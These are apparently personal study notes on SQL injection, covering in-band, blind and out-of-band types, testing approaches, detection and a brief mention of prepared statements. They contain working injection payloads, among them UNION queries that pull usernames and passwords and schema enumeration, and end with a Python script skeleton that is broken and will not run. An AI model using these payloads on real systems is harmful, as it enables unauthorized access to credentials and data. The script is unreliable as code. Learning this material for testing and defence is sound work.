
## SQL Injection

Vulnerability that consist of an attacker interfering with the SQL queries that an application makes to a database.

__Impact of SQl Vulnerablilty__
* confidentiality- unauthorized access to sensitive data like username and passwords
* Integrity - can be used to alter data in database
* Availability - can be used to delete data in database



* can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.
*  SQL injection attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information (PII). 

### Types of SQL Injection

1. In-Band (classic)

when the attacker uses the same communication channel to both launch the attack and gather the result of the attack
- retrieved data is presented directly in the application web page

    * __Error-based sql Injection__: Where you force the database to generate an error giving you more information about how things operate at the back end.

    * __Union based Sql injection__ : It's a technique that leverages the union operator to combine the result of two queries into a single one.

    - the number and order of columns must be the same in all queries, data type must be the same
    - to determine the column (use ORDER BY, use NULL VALUES)
#### union
- to check the number of columns
    `' ORDER by 3 --  (some doesn't accept -- so we can use #)`
    `' ORDER by 3 # (to url encode, CTRL+U)`
    - 'ORDER+by+2%23 if 200 okay, 2 columns present
    - 'ORDER+by+3%23 if 500 internal server error, 3rd column not present (3-1=2 columns only)

    - another method
       `' UNION SELECT NULL --`, if error incorrect no. of column
        `' UNION SELECT NULL, NULL--` ,if 200 okay , 2 columns

- to check if data type is same, `' UNION SELECT 'a', 'a'#`
    this checks if data type of 1st column is text , and 2nd column is also text.
    `'UNION SELECT NULL,'a',NULL --` (to check if particular column has string, if 200 success, otherwise not string) (if the string a is not there in the column content, it adds it to the column and prints it along , if done in browser)

- to find version of database,
`' UNION SELECT @@version, NULL# `  (null is added because there are 2 column)


- to find username and password from table users
`'+UNION+SELECT+username,+password+FROM+users--`


- if there 2 column of 2 different data types and you need to retrieve information
find version of database, then find the respective way to string concatenate. If it is postgreSQl, use ||
`'UNION SELECT NULL, username || '*' || password FROM users--` * is used to seperate useranme and password for readability


`www.test.com/app.php?id=' UNION SELECT username, password FROM users--`
    we didn't give id so it's empty
    `output:ac1, passw1, adm1, pass2`

2. Interential(Blind) 
type of vulnerability where there is no acual transfer of data via the web application (the results can't be seen in the application)
* Boolean:  the results can't be seen in the application, we can only ask the application true or false questions
* Time: pausing the database for a specefic period of time if it waits for the specified time, then it's true(meaning it's vulnerable to time ) . if it doesn't  wait , not true 


* blind sql injection with conditional responses

confirm the parameter is vulnerable (ex. tracking id, change it and notice the effects)



lab 11
















3. Out of Band

when the attacker is unable to use the same channel to launch the attack and gather the results of the attack, it usuallly relies on the ability of an application to make a network connection.
ex: Dns or http request to deliver data to an attacker


OAST payloads designed t trigger an out of band network interation when executed with sql query.


### How to find a sql vulnerablility in an application

Depends on the perspective of testing
* Black box testing : when the tester is given little to no information (usually only given the url of the application and scope of engagement)

* White box testing  : given access to almost everything includig source code.

* grey box: combination of black and white(ex: tester given url and user account details of application) grey box methodology is grouped together with black because of it's limited scope.

### Black Box testing perspective
1. map the application (visit the url, explore functionailties and so much more)
2. Fuzz the application (means adding special characters and checking output to see anything unusual)
    * submit sql specific chracters '    or    ''
    * once you get an error, try building query using multiple requests 
    * submit boolen conditions such a OR 1=1 and Or 1=2 and look for differences in the application's responses 
    * submit payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond
    * submit out of band payloads to trigger an out of band network interaction when used with sql query.


### white box testing

* enable web server logging
* enable database logging
* map the application
* code review 
* test sql vulnerability 


### Exploitation Tool: sqlmap


 ## How to detect SQL Injection vulnerabilities
+ majority of SQL injection vulnerabilities can be found quickly using Burp Suite's web vulnerability scanner.
-  can be detected manually by using a systematic set of tests against every entry point in the application
1. Submitting the single quote character '
2. Boolean conditions such as OR 1=1 and OR 1=2
3. payloads designed to trigger time delays when executed within a SQL query, and looking for differences in the time taken to respond.
4. OAST(out of band application security testing) payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitoring for any resulting interactions.
5. SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.



*Most SQL injection vulnerabilities arise within the WHERE clause of a SELECT query.*

+ The most common other locations where SQL injection arises are in Update,  Select, Insert statements and orderby, where clauses.  (mostly within __where__ of a __select__ query)

+ Some other common locations where SQL injection arises are:

- In UPDATE statements, within the updated values or the WHERE clause.
- In INSERT statements, within the inserted values.
- In SELECT statements, within the table or column name.
- In SELECT statements, within the ORDER BY clause.

### Some common SQL injection examples include:

+ Retrieving hidden data, where you can modify a SQL query to return additional results.
- Subverting application logic, where you can change a query to interfere with the application's logic.
+ UNION attacks, where you can retrieve data from different database tables.
- Blind SQL injection, where the results of a query you control are not returned in the application's responses.

__double-dash sequence -- is a comment indicator in SQL, and means that the rest of the query is interpreted as a comment.__

`username: bhbjhb' or 1=1 --  password: jnkjkj`
`username: bhbjhb--`
SELECT * FROM products WHERE category = 'Gifts'-- AND released = 1

__Since 1=1 is always true, the query will return all items.__
SELECT * FROM products WHERE category = 'Gifts' OR 1=1-- AND released = 1

* to expoit sql injection vulnerability, it is necessary to know some information like the type and __version of the database__ software, the tables and columns that the database contains. 

- Microsoft, MySQL	SELECT @@version
- Oracle	SELECT banner FROM v$version
- PostgreSQL	SELECT version()
`' UNION SELECT @@version--`

__information_schema.tables__(PostgreSQL)
`SELECT table_name, NULL FROM information_schema.tables`
`SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'Users'`
Oracle
`SELECT * FROM all_tables`
`SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE`

search for all tables oracle and you will find the table name 
>> ``SELECT Table_name FROM all_tables`` if we use this, we will get actual table name in response.


- database specific syntax

while using select, sometimes depending on the DB, from is compulsory and if you don't know table name use dual
`' UNION SELECT NULL FROM DUAL--`






#### Preventing SQL Vulneraberalities
* use prepared statements (parameterized queries)

#### scripting
* scripting attacks is useful when dealing with pen testing application


import requests  //for snding and recieving http requests
import sys
import urlib3

proxies = {'http: 'http: 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080}


if __name__ == "__main__":
try:
     url = sys.argv[1].strip()    //strps away blank space
     sqli payload = sys.argv[2].strip()
     

except IndexError:

    print('[-] usage: %s <url> <sql-payload>' % sys.argv[0])
    print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])


    s = requests.Session()  //creating session object
    if explot_sqli(s, url, sqli_payload):
    print('sucess')

    else:
    print('unsuccessful')